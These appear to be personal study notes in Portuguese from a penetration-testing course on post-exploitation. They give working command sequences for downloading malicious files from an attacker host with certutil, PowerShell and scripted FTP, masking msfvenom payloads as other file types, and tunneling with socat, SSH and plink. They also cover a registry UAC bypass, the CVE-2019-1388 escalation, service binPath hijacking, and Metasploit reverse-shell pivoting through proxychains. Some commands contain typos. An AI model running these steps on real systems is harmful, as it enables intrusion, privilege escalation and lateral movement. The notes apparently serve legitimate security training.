

Nesse módulo focaremos em algo que é de extrema importância que é:

> O que fazer após explorar uma vulnerabilidade?

Muitas vezes apenas encontrar a vuln não é o bastante! Pois o foco do Pentest pode ser algo mais profundo.

—> Quando ganhamos uma shell, é ai que o Pentest está começando…

> O que eu sei de exploração pra esse alvo?

> O que eu tentei?

> Quais os resultados?

### Melhorando shell não interativa (caso host tenha python)

```python
python -c 'import pty; pty.spawn("/bin/bash")'

ou

python3 -c 'import pty; pty.spawn("/bin/bash")'
```


----



# Introdução

### Tópicos importantes

**Qual a importância do pós-exploração?**

- Entende a criticidade da vuln encontrada
- Escala privilégios sempre que dá
- Compromete outros hosts
- Cumpre objetivo do Pentest

**Como fazer o pós-exploração?**

- Envenena outros hosts após explorar um host
- Escala privs
- Descobre e ataque serviços internos
- Coleta evidências para exploração

**Diferença entre Shells:**

- Shell Interativa: Você recebe retorno dos comandos enviados para a shell
- Shell Não-Interativa: Shell não retorna o output ao enviar um comando

**Priviliege Scalation Vertical x Horizontal:**

![[Pasted image 20251119225922.png]]




----



# Transferência de arquivos: WEB e FTP

A ideia para explorar o alvo buscando uma shell melhorada nesse item, é realizar o envio de arquivo para o alvo, dessa forma executando e o arquivo enviando uma shell para nosso WEB Server.

Da mesma forma usaremos a mesma lógica para o FTP

### Passo a passo para pós para WEB

1. Abra o HTTP Server no seu servidor
    
    `python3 -m http.server <Porta>`
    
2. No alvo Windows você baixa o arquivo que você está disponibilizando via HTTP Server
    
    `certutil.exe -urlcache -f <[http://<SeuIP>:<SuaPorta>/](<http://127.0.0.1:777/>)<arquivo> <arquivo de saída>` ou
    
    `powershell.exe wget <[http://<SeuIP>:<SuaPorta>/](<http://127.0.0.1:777/>)<arquivo> -Outfile <arquivo de saída>`
    
3. Executa o arquivo que foi feito download no alvo e dessa forma recebe shell no seu PC
    

### Passo a passo para pós para FTP

1. Cria uma lista de comandos passo a passo para executar no FTP do alvo
    
    `echo open <IP atacante> > ftp.txt`
    
    `echo USER anonymous > ftp.txt`
    
    `echo PASS anonymous > ftp.txt`
    
    `echo GET <arquivomalicioso> > ftp.txt`
    
    `echo QUIT > ftp.txt`
    
2. No alvo Windows você baixa o arquivo que você está disponibilizando via FTP Server
    
    `ftp -v -n -s:ftp.txt`
    
3. Dessa forma por causa do -s o FTP do alvo entende que `ftp.txt` é um arquivo de instrução e executa o passo a passo do que está nele, dessa forma baixando o malicioso para podermos explorar!
    




-----






# Transferência de arquivos: Hex e Filetype

Da mesma forma que exploramos como buscar uma shell melhorada com WEB e FTP agora entenderemos como fazer isso via itens hexadecimais e de acordo com o Filetype:

### Passo a passo para pós para HEX

1. O utilitário `exe2hex` transforma executáveis binários em texto ou bat, funcionando bem em sistemas mais antigos
    
    Com isso inicie comprimindo o arquivo malicioso com: `upx -q <arquivo>.exe`
    
2. Agora transformaremos todo esse arquivo comprimido em um output hexadecimal com:
    
    `exe2hex -x <arquivo>.exe -p <arquivosaida>.txt -p` : Como estamos usando -p criaremos um output para powershell
    
3. Com esse novo output agora basta passar todo o output no terminal powershell do alvo, dessa forma escalonando a shell! O arquivo recriado será o malicioso solicitado
    

### Passo a passo para pós para Filetype

Em certos casos a aplicação aceita apenas 1 tipo de upload de arquivos, por isso é interessante que manipulemos o payload malicioso para cumprir os requisitos.

1. Com msfvenon gere o payload malicioso
    
2. Inicie a mascara misturando o payload com outro que cumpra os requisitos
    
    `cat <header do arquivo que cumpre> <payload> > exploit.php`
    
3. Verifique que a mascará é efetiva com `file exploit.php`
    
4. Mande ele pro server com a exploração feita até então e via URL realize a execução do mesmo.
    
    `tail +2 exploit.php` : Chama arquivo malicioso sem o header posto, esse +2 pode alterar com o quantas linhas forem necessárias
    
    _Pode ser necessário dar permissão no alvo para o arquivo, antes de executa-lo_
    




-----






# Tunelamento

Um serviço que pode ser muito útil para escalonar no pós exploração é o chamado Tunelamento, onde pegamos um serviço que está rodando na máquina alvo e enviamos o tráfego que seria direcionado a sua porta para uma porta da máquina do atacante.

### Alvo Linux

Na máquina alvo: `socat TCP4:<IP Atacante>:<Porta do atacante> TCP4:127.0.0.1:<Porta do alvo>`

Na máquina do atacante: `socat TCP-LISTEN:<Porta do Atacante>.reuseaddr,fork TCP4-LISTEN:2222,reuseaddr` : Abre a porta do atacante para receber o tunelamento e a 2222 fica disponível para nos conectarmos visando a porta do alvo!!!!!

_Em caso de dúvida vale rever essa aula importantíssima_

### Tunelamento SSH

`ssh <user>@<IP> -p <porta> -i <chave privada> -L <sua porta>:<IP>:<porta do alvo>`

: Comando acima pega a porta do alvo e tunela ela pra sua porta via SSH!

### Escalonando acesso SSH sem senha!

Caso você tenha acesso ao SSH de um alvo e tenha um vuln explorada vale a pena demais importar a chave SSH para fazer acesso! → Essa tática já foi explorada em módulos passados

### Alvo Windows

Para o caso do Windows existe um executável que pode permitir essas ações, que é o `plink.exe`

EX: `plink.exe -ssh -l <user> -pw root -k <IPatacante>:<PortaAtacante>:127.0.0.1:<PortaAlvo> <IPatacante>`

Para acessar do Kali basta fazer conexão com a porta aberta do atacante para acessar os itens que estão sendo tunelados.




-----





# Enumeração de Host-Windows

Com uma shell no host Windows é importante fazermos verificações no host pré escalonamento de privs, para dessa forma tentamos tornar essa ação possível.

### Comandos de verificação básica:

- `whoiam` e `whoiam /groups` : Verifica user
- `net user` : Info de todos os usuários registrados no PC
- `hostname` : Nome da máquina
- `systeminfo` : Verifica informações da máquina
- `tasklist` e `tasklist /suc` : Lista processos
- `route print` : Mostra rotas
- `netstat -ano` : Mostra portas abertas
- `ipconfig /all` : Informações de rede da máquina

`where /R <path> <arquivo> c:\\` : Procura arquivo no Windwos

`findstr /s “palavra” *.txt` : Procura nos txts da máquina os que tenham a palavra

### Enumeração automatizada

No git podemos pegar vários enumeradores da comunidade que podem auxiliar no processo com Windows

EX: [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### Mecanismo de integridade

O Mecanismo de integridade muitas vezes pode se sobrepor ao ao grupo de usuários no Windows, fazendo com que você tenha problemas eventualmente para executar arquivos, comandos e acessar diretórios.

`icacls "caminho\\do\\arquivo”` → Olha qual é o mecanismo de integridade do arquivo

—> Esse mecanismo pode fazer você precisar fazer UAC, sendo assim o bypass de UAC é importatissímo



----






# Estudo técnico: BYpass de UAC

Como fazer o bypass de UAC manualmente? Sem precisar necessariamente do metasploit.

- `SysinternalSuite` : Suite da Microsoft que contém os apps Procmon e Sigcheck (fazer download)

`sigcheck -a -m <path do programa>` : Podemos pegar o nível de privilégio do programa necessário para executa-lo

EX: “Require Administrator” → User precisa ser admin para execução

### Passo a passo para Bypass

1. Com procmon.exe monitoramentos os processos
    
    Filtre os processos usando o filtro, filtre por processos apenas com operation reg, path HKW (Processo que podemos executar)
    
    Filtre também pelos que tiverem result = name not found (`processos exploráveis)`
    
2. Se acharmos processos com os requisitos acima completos suas shell/command podem ser de grande valia. Sendo assim siga para criar os registradores necessários no regedit
    
    Mude no regedit para que desses procesos alvos não seja not found o valor e sendo assim manipulemos as ações
    
3. Com isso quando o processo for chamado ele vai ter privs de system, porque é a maquina que inicia, e vai ir no regedit realizar as ações que colocamos lá. Aplicando o que quiseremos
    




----





# Windows PrivExec

Nessa sessão burlaremos a execução de comandos administrativos usando algumas técnicas presentes no Windows de forma que usemos itens presentes na máquina para executa-los

### Certificate Dialog

No server simularemos o download de um certificado para explorar o CVE-2019-1388 onde com esse certificado conseguimos executar comandos como admin

1. Com o comando `certutil.exe -urlcache -f http:/<IPatacante>//<pasta>/priv.exe` baixe o arquivo do seu http server
    
2. Execute o arquivo no Windows
    
3. Quando vier a box clique para ver + detalhes do certificado
    
4. Clique no link do Issued by:
    
5. Quando você clicar no link ele vai abrir o explorer, de um save page na página aberta (ou open nas opções …) e salve a página no C:/Windows/system32/cmd.exe ou pasta te priv equivalente
    
    E com isso teremos um arquivo malicioso em pasta admin sendo executado pelo admin
    

### Item 1 (Fodástico)

Nesse caso focamos em atacar serviços mal configurados a nível de privilégio para executar comandos como admin

1. No CMD alvo de o comando `wmic services` ou `wmic services Name,State,PathName`
    
2. Foque a análise em programas que foram instalados por algum user, se ele for executável por vários users será um vetor pra nós!
    
3. Com o comando icacls “`<path do arquivo>`” veja quais as permissões do arquivo, caso ele tenha full access de algum user ou grupo é bom pra nós (Service_All_Users)
    
4. sc query <Nome do serviço> : Pega infos do serviço
    
5. Agora com um programa que identificamos que é vetor alteraremos o binário dele para 1 linha de comando para ser executada com: `sc config <programa> binPath=”<comando>”`
    
6. Feito isso basta reiniciar o programa, quando ele for reiniciado o usuário root vai executar o binário e dessa forma aplicar o comando como admin!
    
    `sc stop <programa>`
    
    `sc start <programa>`
    
    _Observe no item 2 o que fazer caso mesmo assim ainda seja bloqueado o comando_
    

### Item 2

No cenário do item 2 estamos observando o comportamento onde mesmo após aplicar tudo do item 1 o comando ainda é bloqueado ou é bloqueado a mudança do binário.

Nesse caso o que faremos é substituir TODO o arquivo com Full Access para um arquivo malicioso.

1. Baixe o arquivo malicioso do alvo via `certutil.exe -urlcache -f http:/<IPatacante>//<pasta>/priv.exe` . Ele ainda não funcionará pq precisa ser executado como admin
    
2. Da move do arquivo malicioso para a mesma pasta do arquivo com Full Access observado
    
    `mv /Desktop/Downloads/<arquivo> <arquivo>` : Você pode verificar esse path abrindo as propriedades do programa
    
3. Remova o arquivo vulnerável da pasta
    
4. Agora reinicie o programa, caso não funcione reinicie a máquina ou espere ela ser reiniciada pelo admin. Quando isso ocorrer ele vai executar novamente o programa mas dessa vez o malicioso, e dessa forma o root terá executado ele com privs de admin!

----



# Pivoting: da Internet a rede interna

A técnica de pivoting basicamente consiste em **pular de host em host** comprometendo dessa forma toda a rede

1. Inicie validando a rede com `ip a` , verifique as rotas também com `route print`
    
2. Você pode rodar o comando `run autoroute <rede/máscara>` para no meterpreter criar um túnel entre essa rede e a sua session no meterpreter
    
3. Com o comando acima e `background` você pode usar módulos para explorar a rede
    
    EX: `auxiliary/server/socks4a` : Abre a porta e com proxychains podemos fazer um proxy
    

### Resumo do processo para Pivoting com exemplo:

```python
1. Cria e envia payload malicioso ao alvo e consegue shell meterpreter
msfvenom <path do payload> LHOST=<SeuIP> LPORT=<Sua porta> -f raw > <ARQUIVO FINAL>.<EXTENSÃO>

2. Abre meterpreter

3. Recebe shell com o clássico handler
msfconsole 
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set LHOST <IP>
set LPORT <Porta>
exploit

4. Agora com meterpreter cria uma rota para a rede a ser explorada apontando para o alvo
run autoroute -s <Subnet/Mask>

5. Em background roda o socksproxy em uma porta a sua escolha, basta escolher a porta e rodar
background
use auxiliary/server/socks_proxy
set SRVPORT <PORTA>
set VERSION 5
run -j

6. Agora no proxychains4 do seu Kali (Caso não tenha baixe) altere no final arquivo /etc/proxychains.conf
socks5  127.0.0.1 <MESMA PORTA>

7. Execute comandos com proxychains4 na frente quando eles forem destinados a rede alvo a partir do host atacado

ex: proxychains nmap -v 172.23.10.0./24 -p- -Pn -

*ERROS no Proxychains? --> Tente proxychains -q

*De forma alterantiva tem o comando proxychains4 e o /etc/proxychains4.conf
```

Palavras chave: proxychains, autoroute, msfvenom, socks, proxy

### **`PING NÃO FUNCIONA COM PROXYCHAINS!!!`**